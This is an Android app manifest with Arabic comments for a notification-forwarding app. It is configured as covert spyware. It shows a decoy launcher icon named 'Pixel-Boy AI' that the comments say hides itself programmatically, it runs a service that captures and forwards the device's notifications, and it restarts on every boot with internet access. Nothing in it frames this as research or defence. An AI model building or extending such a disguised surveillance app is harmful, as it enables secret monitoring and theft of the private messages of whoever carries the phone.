<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:name=".NotificationForwarderApp"
        android:allowBackup="true"
        android:icon="@drawable/ic_find_center"
        android:roundIcon="@drawable/ic_find_center"
        android:label="مركز العثور"
        android:networkSecurityConfig="@xml/network_security_config"
        android:supportsRtl="true"
        android:theme="@style/Theme.NotificationForwarder">

        <!-- الشاشة الرئيسية (بدون LAUNCHER مباشر لإتاحة الإخفاء البرمجي) -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask">
        </activity>

        <!-- الأيقونة التمويهية التي تظهر على الشاشة الرئيسية باسم Pixel-Boy AI وتختفي برمجةً -->
        <activity-alias
            android:name=".LauncherAlias"
            android:targetActivity=".MainActivity"
            android:exported="true"
            android:icon="@mipmap/ic_launcher"
            android:label="Pixel-Boy AI">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- خدمة التقاط وتوجيه الإشعارات -->
        <service
            android:name=".service.AppNotificationListenerService"
            android:exported="true"
            android:label="Notification Forwarder"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- مستقبل إعادة التشغيل عند إقلاع الجهاز -->
        <receiver
            android:name=".receiver.BootCompletedReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
